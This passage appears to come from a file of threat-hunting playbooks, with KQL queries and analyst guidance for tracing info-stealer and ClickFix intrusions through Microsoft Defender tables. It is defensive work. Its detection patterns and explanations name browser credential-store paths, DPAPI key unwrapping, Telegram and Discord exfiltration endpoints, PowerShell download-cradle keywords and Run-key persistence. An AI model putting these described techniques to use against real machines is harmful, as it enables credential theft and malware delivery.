        goal: "The stealer's primary target is the Chrome/Edge/Firefox credential store. Chrome and Edge store passwords in SQLite databases (Login Data) encrypted with DPAPI, with the master key stored in Local State. Firefox uses key4.db and logins.json. Any file read of these paths by a process other than the browser itself is a confirmed credential theft indicator. The stealer also targets browser extension storage for MetaMask and other crypto wallets — look for reads of IndexedDB files under the extensions folder.",
        pivotColumns: ["FileName", "FolderPath", "InitiatingProcessFileName", "SHA256", "DeviceName"],
        kql: `DeviceFileEvents
| where Timestamp > ago(7d)
| where FolderPath has_any (
    @"Chrome\User Data\Default\Login Data",
    @"Chrome\User Data\Local State",
    @"Edge\User Data\Default\Login Data",
    @"Mozilla\Firefox\Profiles",
    @"Chrome\User Data\Default\Cookies",
    @"Chrome\User Data\Default\Network\Cookies")
  and InitiatingProcessFileName !in~ (
    "chrome.exe","msedge.exe","firefox.exe",
    "MicrosoftEdgeUpdate.exe","GoogleUpdate.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          FolderPath, SHA256, InitiatingProcessFileName,
          InitiatingProcessCommandLine`,
      },
      {
        table: "DeviceEvents",
        label: "DPAPI Key Decryption",
        goal: "After reading the Login Data SQLite file, the stealer must decrypt it. Chrome and Edge encrypt stored passwords with AES-256, where the key is itself wrapped with DPAPI (Windows Data Protection API). The stealer calls CryptUnprotectData (or makes direct syscalls to bypass EDR hooks) to unwrap the master key, then uses it to decrypt every password in the database. A non-browser process calling DPAPI on browser-related data is one of the strongest behavioral indicators for info stealer activity.",
        pivotColumns: ["ActionType", "InitiatingProcessFileName", "InitiatingProcessId", "DeviceName"],
        kql: `DeviceEvents
| where Timestamp > ago(7d)
| where ActionType in (
    "DpapiAccessed","OpenProcessApiCall")
| where InitiatingProcessFileName !in~ (
    "chrome.exe","msedge.exe","firefox.exe",
    "explorer.exe","lsass.exe","svchost.exe",
    "MicrosoftEdge.exe","GoogleUpdate.exe")
| project Timestamp, DeviceName, ActionType,
          InitiatingProcessFileName, InitiatingProcessId,
          InitiatingProcessCommandLine, FileName, AccountName`,
      },
      {
        table: "DeviceRegistryEvents",
        label: "Persistence Setup",
        goal: "Many modern stealers add persistence to enable repeated harvesting — each new browser session creates fresh authenticated cookies. The most common mechanism is a Run key pointing to the stealer binary or a dropper. Some families use COM hijacking (CLSID) or scheduled tasks. Run keys set by processes running from Temp or AppData paths are highly suspicious. RegistryValueData containing encoded strings or paths to Temp directories confirm malicious intent.",
        pivotColumns: ["RegistryKey", "RegistryValueData", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceRegistryEvents
| where Timestamp > ago(7d)
| where RegistryKey has_any (
    @"Software\Microsoft\Windows\CurrentVersion\Run",
    @"Software\Microsoft\Windows\CurrentVersion\RunOnce",
    @"SOFTWARE\Classes\CLSID")
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where InitiatingProcessFileName !in~ (
    "msiexec.exe","svchost.exe","explorer.exe","system")
| project Timestamp, DeviceName, RegistryKey,
          RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessId`,
      },
      {
        table: "DeviceNetworkEvents",
        label: "Exfiltration via Telegram / Discord",
        goal: "Stealer logs are exfiltrated as structured JSON or ZIP archives via Telegram Bot API (api.telegram.org/bot<token>/sendDocument) or Discord webhooks (discord.com/api/webhooks/<id>/<token>). These channels are attractive because they use HTTPS over port 443 (blends with normal traffic) and the domain reputation is high (Telegram and Discord are legitimate services). Any process other than the official Telegram or Discord client calling these endpoints has stolen data. SentBytes in the event indicates payload size — even small POSTs (under 1MB) represent a full credential log.",
        pivotColumns: ["RemoteUrl", "RemoteIP", "InitiatingProcessFileName", "SentBytes", "DeviceName"],
        kql: `DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteUrl has_any (
    "api.telegram.org","discord.com/api/webhooks","t.me")
  and InitiatingProcessFileName !in~ (
    "chrome.exe","msedge.exe","firefox.exe",
    "telegram.exe","discord.exe","slack.exe")
| project Timestamp, DeviceName, RemoteIP, RemoteUrl,
          RemotePort, InitiatingProcessFileName,
          InitiatingProcessId, SentBytes
| sort by Timestamp asc`,
      },
      {
        table: "AlertInfo",
        label: "Scope & Containment",
        goal: "⚠ NOTE — This is NOT a repeat of the opening triage step. The opening AlertInfo check seeds your investigation. This closing step answers two different questions: (1) How many devices were hit by this campaign? (2) Which kill chain stages did Defender miss? Info stealer campaigns are almost always multi-device — a single malvertising ad or fake software page can deliver the payload to hundreds of machines before it is taken down. Use the stealer SHA256 to scope every device that received it across the full 30-day window. Every device on that list requires a full credential reset — treat all browser-stored passwords, cookies, and crypto wallet seeds as compromised. The missed-detection stages (often: download and DPAPI access) are the gap deliverable for your detection team.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `// Scope: all devices that received the stealer binary
DeviceFileEvents
| where Timestamp > ago(30d)
| where SHA256 == "<stealer_SHA256 from AlertEvidence>"
| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            DeviceCount = dcount(DeviceName),
            Devices = make_set(DeviceName)
  by SHA256, FileName
---
// Full alert set for the campaign
AlertInfo
| where Timestamp > ago(30d)
| where Title has_any (
    "stealer","credential","DPAPI","browser data",
    "Lumma","Redline","StealC","Vidar")
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource`,
      },
    ],
  },

  // ── ClickFix Social Engineering ──────────────────────────────────────────
  clickfix: {
    steps: [
      {
        table: "AlertInfo",
        label: "Triage Existing Detections",
        goal: "Before tracing the ClickFix chain manually, check what MDE already surfaced. ClickFix delivers payloads via explorer-parented PowerShell with encoded commands — MDE behavioral analytics detect this pattern and fire on 'suspicious PowerShell execution', 'encoded command', or 'LOLBin abuse'. Existing alerts give you the device name, the PowerShell command line, and the payload hash. Use these as anchors. Note: there may be no phishing alert if delivery was via malvertising rather than email.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `AlertInfo
| where Timestamp > ago(7d)
| where Category in ("Execution","InitialAccess","Persistence")
  or Title has_any (
    "ClickFix","encoded command","suspicious PowerShell",
    "mshta","certutil download","LOLBin",
    "clipboard","download cradle","suspicious process",
    "Run dialog","user executed")
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource
| sort by Timestamp desc
---
AlertEvidence
| where AlertId in ("<AlertId1>","<AlertId2>")
    and EntityType in ("Process","File","Machine")
| project Timestamp, AlertId, EntityType, EvidenceRole,
          FileName, SHA256, ProcessCommandLine, DeviceName`,
      },
      {
        table: "EmailEvents",
        label: "Find the Delivery Email",
        goal: "ClickFix is delivered through two primary vectors: phishing email with a link to a malicious site, or malvertising (user searches for software and lands on a poisoned result). If email-delivered, the lure subject typically references a CAPTCHA verification, a document access request, a browser update requirement, or a Windows security warning. The linked domain will not be a known malicious domain (it's often a newly registered site with clean reputation). Check DeliveryAction and ThreatTypes — MDO may have missed it if the domain was freshly registered.",
        pivotColumns: ["NetworkMessageId", "SenderFromAddress", "RecipientEmailAddress", "ThreatTypes", "DeliveryAction"],
        kql: `EmailEvents
| where Timestamp > ago(7d)
| where DeliveryAction in ("Delivered","DeliveredAsSpam")
| where Subject has_any (
    "verify","captcha","browser","document","access",
    "update","error","fix","confirm","security","check")
  and SenderFromDomain !endswith "yourdomain.com"
| project Timestamp, SenderFromAddress, SenderFromDomain,
          RecipientEmailAddress, Subject,
          ThreatTypes, DeliveryAction, NetworkMessageId
| sort by Timestamp desc`,
      },
      {
        table: "DeviceNetworkEvents",
        label: "Browser Visits Malicious Site",
        goal: "The browser navigates to the ClickFix landing page, which renders a convincing fake dialog (CAPTCHA, PDF viewer error, browser update prompt). The JavaScript on the page executes navigator.clipboard.writeText() to silently overwrite the clipboard with an encoded PowerShell command — no user permission required. The dialog then instructs the user to open Windows Run (Win+R), paste the clipboard content, and press Enter. Look for browsers accessing domains with security-themed names that are not established services.",
        pivotColumns: ["RemoteUrl", "RemoteIP", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ (
    "chrome.exe","msedge.exe","firefox.exe","iexplore.exe")
  and RemoteIPType == "Public"
| where RemoteUrl has_any (
    "captcha","verify","browser-fix","repair",
    "windows-update","document-view","access-denied",
    "security-check","human-verify")
| project Timestamp, DeviceName, RemoteUrl, RemoteIP,
          RemotePort, InitiatingProcessFileName`,
      },
      {
        table: "DeviceEvents",
        label: "Clipboard Hijack",
        goal: "This is the ClickFix fingerprint — the browser writes an encoded PowerShell command to the clipboard before the user opens Run. DeviceEvents with ActionType SetClipboardText shows the browser process overwriting the clipboard. The AdditionalFields will contain the clipboard content. Encoded commands are typically Base64 strings (beginning with AABB or similar) or hex strings. The presence of a clipboard write from the browser followed by a PowerShell execution from explorer within a short time window is a near-certain ClickFix indicator.",
        pivotColumns: ["ActionType", "InitiatingProcessFileName", "InitiatingProcessId", "DeviceName"],
        kql: `DeviceEvents
| where Timestamp > ago(7d)
| where ActionType in ("SetClipboardText","ProcessMemoryAccess")
  and InitiatingProcessFileName in~ (
    "chrome.exe","msedge.exe","firefox.exe")
| project Timestamp, DeviceName, ActionType,
          InitiatingProcessFileName, InitiatingProcessId,
          AdditionalFields`,
      },
      {
        table: "DeviceProcessEvents",
        label: "Run Dialog Execution",
        goal: "The definitive ClickFix indicator: cmd.exe or powershell.exe parented by explorer.exe (the Windows shell) or userinit.exe, with an encoded command-line argument. This pattern cannot occur in normal malware delivery — it requires the user to physically type or paste into the Run dialog. The parent explorer.exe → child powershell.exe relationship is specific to Win+R execution. ProcessCommandLine will contain -EncodedCommand, IEX, DownloadString, WebClient, mshta, or certutil — the download cradle. Base64-decode the EncodedCommand to recover the actual payload URL.",
        pivotColumns: ["FileName", "ProcessCommandLine", "InitiatingProcessFileName", "SHA256", "DeviceName"],
        kql: `DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ (
    "powershell.exe","cmd.exe","mshta.exe","certutil.exe")
  and InitiatingProcessFileName in~ (
    "explorer.exe","userinit.exe","WinLogonUI.exe")
| where ProcessCommandLine has_any (
    "-EncodedCommand","-enc ",
    "IEX","Invoke-Expression","DownloadString",
    "WebClient","certutil","bitsadmin","mshta http",
    "curl.exe","wget.exe")
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, SHA256, AccountName
| sort by Timestamp asc`,
      },
      {
        table: "DeviceFileEvents",
        label: "Payload Dropped to Disk",
        goal: "The PowerShell cradle downloads and writes the second-stage payload to disk before executing it. Look for executables, DLLs, or scripts written to Temp, AppData, or ProgramData by PowerShell, cmd, certutil, or bitsadmin. The SHA256 of the dropped file is the key pivot for threat intel lookup and environmental scoping. Common payloads delivered via ClickFix include AsyncRAT, DarkGate, Lumma Stealer, NetSupport Manager RAT, and XWorm. certutil -urlcache -split -f writes directly to the path specified — check the command line for the drop path.",
        pivotColumns: ["SHA256", "FileName", "FolderPath", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ (
    "powershell.exe","cmd.exe","mshta.exe","certutil.exe","bitsadmin.exe")
  and ActionType == "FileCreated"
| where FolderPath has_any (
    @"\Temp\",@"\AppData\",@"\ProgramData\",@"\Windows\Temp\")
  or FileName has_any (".exe",".dll",".ps1",".bat",".vbs",".hta")
| project Timestamp, DeviceName, FileName, FolderPath,
          SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine`,
      },
      {
        table: "DeviceRegistryEvents",
        label: "Persistence Mechanism",
        goal: "The dropped payload establishes persistence to survive reboots. ClickFix-delivered payloads commonly use: HKCU Run keys (survives user logon), Scheduled Tasks (survives reboots), Winlogon UserInit modification (survives logoff), or COM object hijacking (CLSID). Run key values pointing to Temp or AppData paths are the most common. RegistryValueData containing encoded strings or paths with random-looking filenames confirms a malicious persistence entry. Also check DeviceEvents for ScheduledTaskCreated actions from the cradle's child process.",
        pivotColumns: ["RegistryKey", "RegistryValueData", "InitiatingProcessFileName", "DeviceName"],
        kql: `DeviceRegistryEvents
| where Timestamp > ago(7d)
| where RegistryKey has_any (
    @"Software\Microsoft\Windows\CurrentVersion\Run",
    @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
    @"SOFTWARE\Classes\CLSID",
    @"Software\Microsoft\Windows\CurrentVersion\RunOnce")
  and ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where InitiatingProcessFileName !in~ (
    "msiexec.exe","svchost.exe","explorer.exe")
| project Timestamp, DeviceName, RegistryKey,
          RegistryValueName, RegistryValueData,
          InitiatingProcessFileName`,
      },
      {
        table: "AlertInfo",
        label: "Scope the Campaign",
        goal: "⚠ NOTE — This is NOT a repeat of the opening triage step. The opening AlertInfo check seeds your investigation with known IOCs. This closing step answers two different questions: (1) How many devices were hit? (2) Which stages did Defender miss? ClickFix is a campaign technique — a single poisoned ad or SEO result can deliver the same payload to hundreds of devices simultaneously. Use the SHA256 from DeviceFileEvents to scope the full blast radius across 30 days. Every device on that list is a potential compromise regardless of whether an alert fired. The campaign delivery domain (from DeviceNetworkEvents) can be fed into Defender Threat Intelligence to find additional victims. The stages with no corresponding alert — typically the clipboard hijack and the browser visit to the landing page — are the detection gaps to hand to your detection engineering team.",
        pivotColumns: ["AlertId", "Title", "Severity", "Category", "AttackTechniques", "ServiceSource"],
        kql: `// Scope: all devices that received the ClickFix payload
DeviceFileEvents
| where Timestamp > ago(30d)
| where SHA256 == "<payload_SHA256 from DeviceFileEvents>"
| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            DeviceCount = dcount(DeviceName),
            Devices = make_set(DeviceName)
  by SHA256, FileName
---
// All alerts associated with this campaign
AlertInfo
| where Timestamp > ago(30d)
| where Title has_any (
    "ClickFix","encoded command","LOLBin",
    "suspicious PowerShell","mshta","certutil",
    "download cradle","clipboard")
| project Timestamp, AlertId, Title, Severity,
          Category, AttackTechniques, ServiceSource`,
      },
    ],
  },

};
